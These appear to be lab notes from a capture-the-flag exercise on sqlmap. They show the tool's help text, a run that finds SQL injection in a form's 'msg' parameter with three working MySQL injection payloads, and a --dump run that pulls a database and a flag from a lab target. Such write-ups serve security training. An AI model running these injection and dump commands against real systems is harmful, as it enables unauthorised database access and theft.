# SQLmap

Options
```
kali@kali:~/thm/ccPentest$ sqlmap -h
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'
```

Example run
```
kali@kali:~/thm/ccPentest$ sqlmap -u 10.10.164.241 --forms
        ___
       __H__                                                                                                                       
 ___ ___[,]_____ ___ ___  {1.5.4#stable}                                                                                           
|_ -| . [(]     | .'| . |                                                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                                                          
      |_|V...       |_|   http://sqlmap.org                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:06:50 /2021-05-08/

[05:06:50] [INFO] testing connection to the target URL
[05:06:51] [INFO] searching for forms
[#1] form:
POST http://10.10.164.241/
POST data: msg=
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: msg=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[05:07:09] [INFO] using '/home/kali/.sqlmap/output/results-05082021_0507am.csv' as the CSV results file in multiple targets mode
[05:07:09] [INFO] testing if the target URL content is stable
[05:07:10] [INFO] target URL content is stable
[05:07:10] [INFO] testing if POST parameter 'msg' is dynamic
[05:07:10] [WARNING] POST parameter 'msg' does not appear to be dynamic
[05:07:11] [INFO] heuristic (basic) test shows that POST parameter 'msg' might be injectable (possible DBMS: 'MySQL')
[05:07:11] [INFO] heuristic (XSS) test shows that POST parameter 'msg' might be vulnerable to cross-site scripting (XSS) attacks
[05:07:11] [INFO] testing for SQL injection on POST parameter 'msg'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[05:08:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:08:08] [WARNING] reflective value(s) found and filtering out
[05:08:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:08:12] [INFO] testing 'Generic inline queries'
[05:08:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:08:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:08:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:09:01] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:09:03] [INFO] POST parameter 'msg' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="Got")
[05:09:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:09:03] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:09:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:09:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:09:05] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:09:05] [INFO] POST parameter 'msg' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[05:09:05] [INFO] testing 'MySQL inline queries'
[05:09:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:09:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:09:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:09:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:09:06] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[05:09:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[05:09:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:09:18] [INFO] POST parameter 'msg' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:09:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:09:18] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:09:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:09:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:09:21] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 
[05:09:58] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')                                                                                                                        
[05:10:05] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:10:12] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:10:20] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:10:27] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:10:34] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:10:40] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:10:48] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:10:55] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:11:02] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
POST parameter 'msg' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 371 HTTP(s) requests:
---
Parameter: msg (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msg=QGSG' RLIKE (SELECT (CASE WHEN (3027=3027) THEN 0x51475347 ELSE 0x28 END))-- XDky

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: msg=QGSG' AND GTID_SUBSET(CONCAT(0x716b706b71,(SELECT (ELT(9929=9929,1))),0x7171627071),9929)-- csfD

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=QGSG' AND (SELECT 1534 FROM (SELECT(SLEEP(5)))KnMT)-- kqto
---
do you want to exploit this SQL injection? [Y/n] 
[05:14:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 7.0.33
back-end DBMS: MySQL >= 5.6
[05:14:03] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.sqlmap/output/results-05082021_0507am.csv'                                                                                                               

[*] ending @ 05:14:03 /2021-05-08/
```

Dumping the databases
```
kali@kali:~/thm/ccPentest$ sqlmap -u 10.10.164.241 --forms --dump
        ___
       __H__                                                                                                                            
 ___ ___["]_____ ___ ___  {1.5.4#stable}                                                                                                
|_ -| . [.]     | .'| . |                                                                                                               
|___|_  [']_|_|_|__,|  _|                                                                                                               
      |_|V...       |_|   http://sqlmap.org                                                                                             

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:15:47 /2021-05-08/

[05:15:47] [INFO] testing connection to the target URL
[05:15:47] [INFO] searching for forms
[#1] form:
POST http://10.10.164.241/
POST data: msg=
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: msg=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[05:16:48] [INFO] resuming back-end DBMS 'mysql' 
[05:16:48] [INFO] using '/home/kali/.sqlmap/output/results-05082021_0516am.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: msg (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msg=QGSG' RLIKE (SELECT (CASE WHEN (3027=3027) THEN 0x51475347 ELSE 0x28 END))-- XDky

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: msg=QGSG' AND GTID_SUBSET(CONCAT(0x716b706b71,(SELECT (ELT(9929=9929,1))),0x7171627071),9929)-- csfD

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=QGSG' AND (SELECT 1534 FROM (SELECT(SLEEP(5)))KnMT)-- kqto
---
do you want to exploit this SQL injection? [Y/n] 
[05:16:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 7.0.33
back-end DBMS: MySQL >= 5.6
[05:16:50] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[05:16:50] [INFO] fetching current database
[05:16:50] [WARNING] reflective value(s) found and filtering out
[05:16:50] [INFO] retrieved: 'tests'
[05:16:50] [INFO] fetching tables for database: 'tests'
[05:16:51] [INFO] retrieved: 'lol'
[05:16:51] [INFO] retrieved: 'msg'
[05:16:51] [INFO] fetching columns for table 'msg' in database 'tests'
[05:16:52] [INFO] retrieved: 'msg'
[05:16:52] [INFO] retrieved: 'varchar(100)'
[05:16:52] [INFO] fetching entries for table 'msg' in database 'tests'
[05:16:53] [INFO] retrieved: 'msg'
[05:16:53] [INFO] retrieved: 'test'
Database: tests
Table: msg
[2 entries]
+------+
| msg  |
+------+
| msg  |
| test |
+------+

[05:16:53] [INFO] table 'tests.msg' dumped to CSV file '/home/kali/.sqlmap/output/10.10.164.241/dump/tests/msg.csv'
[05:16:53] [INFO] fetching columns for table 'lol' in database 'tests'
[05:16:54] [INFO] retrieved: 'flag'
[05:16:54] [INFO] retrieved: 'varchar(100)'
[05:16:54] [INFO] fetching entries for table 'lol' in database 'tests'
[05:16:55] [INFO] retrieved: 'found_me'
Database: tests
Table: lol
[1 entry]
+----------+
| flag     |
+----------+
| found_me |
+----------+

[05:16:55] [INFO] table 'tests.lol' dumped to CSV file '/home/kali/.sqlmap/output/10.10.164.241/dump/tests/lol.csv'
[05:16:55] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.sqlmap/output/results-05082021_0516am.csv'                                                                                                                         

[*] ending @ 05:16:55 /2021-05-08/
```
